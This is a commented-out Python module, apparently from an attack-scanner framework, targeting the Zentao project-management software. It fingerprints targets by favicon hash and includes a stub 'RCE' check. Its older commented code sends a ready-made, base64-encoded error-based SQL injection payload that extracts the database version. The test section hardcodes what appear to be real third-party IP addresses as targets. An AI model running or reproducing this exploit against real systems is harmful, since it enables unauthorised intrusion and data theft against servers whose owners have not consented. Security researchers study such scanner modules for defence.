# # coding=utf-8
# # @Author   : zpchcbd HG team
# # @Time     : 2021-09-08 16:30
#
# from colorama import Fore
# from tqdm import tqdm
#
# from exploit.web import BaseScript
# from core.MyEnums import *
# from core.MyAsyncHttp import *
#
#
# class Script(BaseScript):
#     name = 'Zentao'
#
#     def __init__(self, target, pbar):
#         super().__init__()
#         # 漏洞目标
#         self.target = target
#         # 漏洞等级
#         self.bugLevel = BugLevel.HIGH
#         # 类型
#         self.bugType = BugType.WRITEFILE
#         # 编号
#         self.bugNumber = ''
#         # 来源
#         self.refer = ''
#         # 特定路径判断
#         self.detectPathList = ['/zentao/favicon.ico', 'favicon.ico']
#         # exec
#         self.execPathList = ['']
#         # 进度条
#         self.pbar = pbar
#         # 相关信息
#         self.info = 'version == 9.2.1'
#         # e89 较老版本 b1d 较新版本
#         self.favicon = ['e89fbe166ded2a714ef73377ece0062b', 'b1d3deb4bd16c8c1637235515deea114']
#
#     async def detect(self):
#         try:
#             async with aiohttp.ClientSession() as session:
#                 for detectPath in self.detectPathList:
#                     url = f'http://{self.target}{detectPath}' if self.target.startswith(
#                         ('http:', 'https:')) is False else f'{self.target}{detectPath}'
#                     async with session.get(url=url, timeout=10, verify_ssl=False) as response:
#                         if response is not None:
#                             text = await response.read()
#                             m1 = hashlib.md5()
#                             m1.update(text)
#                             theMD5 = m1.hexdigest()
#                             for _ in self.favicon:
#                                 if _ == theMD5:
#                                     self.flag = True
#                                     tqdm.write(Fore.RED + '[{}] {}'.format('Zentao Finger', url))
#                                     return {'name': 'Zentao Finger', 'url': url, 'software': 'Zentao'}
#         except Exception:
#             return None
#
#     async def exec(self):
#         try:
#             async with aiohttp.ClientSession() as session:
#                 for execPath in self.execPathList:
#                     url = f'http://{self.target}{execPath}' if self.target.startswith(
#                         ('http:', 'https:')) is False else f'{self.target}{execPath}'
#                     async with session.get(url=url, timeout=10, verify_ssl=False) as response:
#                         if response is not None:
#                             text = await response.text()
#                             await asyncio.sleep(2)
#                             if 'It works!' in text:
#                                 tqdm.write(Fore.RED + '[{}] {}'.format('Zentao RCE', url))
#                                 return {'name': 'Zentao RCE', 'url': url, 'software': 'Zentao'}
#         except Exception:
#             return None
#
#     async def attack(self, semaphore):
#         async with semaphore:
#             a = await self.detect()
#             if a is not None:
#                 self.vulList.append(a)
#             if self.flag:
#                 b = await self.exec()
#                 if b is not None:
#                     self.vulList.append(b)
#         self.pbar.update(1)
#         return self.vulList
#
#
# if __name__ == '__main__':
#     import requests
#     import hashlib
#     resp = requests.get('http://122.49.32.117:8099/zentao/favicon.ico', verify=False)
#     if resp.status_code == 200:
#         m1 = hashlib.md5()
#         m1.update(resp.content)
#         theMD5 = m1.hexdigest()
#         print(theMD5)
#
#     # sem = asyncio.Semaphore(500)
#     # sc = Script('61.150.65.205:9999', 1, sem)
#     # l = asyncio.get_event_loop()
#     # l.run_until_complete(sc.attack())
#
#
#     # # 调用各种漏洞检测方法
#     # def run_detect(self, url):
#     #     # 检测是否是禅道
#     #     if self.check(url):
#     #         # 漏洞1
#     #         self.webVul1(url)
#     #
#     # def check(self, url):
#     #     ico_url = url + '/zentao/favicon.ico'
#     #     m1 = hashlib.md5()
#     #     try:
#     #         m1.update(requests.get(url=ico_url, headers=self.headers, proxies=self.proxies, timeout=20, verify=False,
#     #                                allow_redirects=False).content)
#     #         the_md5 = m1.hexdigest()
#     #         # print(the_md5)
#     #         if the_md5 == 'e89fbe166ded2a714ef73377ece0062b':
#     #             tqdm.write(Fore.RED + '[{}] {}'.format('禅道', url))
#     #             self.vul_list.append(['禅道', url, 'Maybe'])
#     #             return True
#     #         else:
#     #             return False
#     #     except Exception as e:
#     #         return False
#     #
#     # # 漏洞1
#     # def webVul1(self, url):
#     #     # 报错注入，数据库版本
#     #     '''
#     #     GET /zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdmVyc2lvbigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/1.1
#     #     Host: IP:PORT
#     #     Referer: http://IP:PORT/
#     #     '''
#     #     sqlError_url = url + '/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdmVyc2lvbigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='
#     #     self.headers['Referer'] = url
#     #     try:
#     #         res = requests.get(url=sqlError_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
#     #         if res.status_code == 200 and 'XPATH syntax error' in res.text:
#     #             tqdm.write(Fore.RED + '[{}] {} Yes SQL Inject'.format('禅道', url))
#     #             self.vul_list.append(['禅道', url, 'Yes SQL Inject'])
#     #     except Exception as e:
#     #         return False
#     #
#     # # 漏洞2
#     # def webVul2(self, url):
#     #     pass
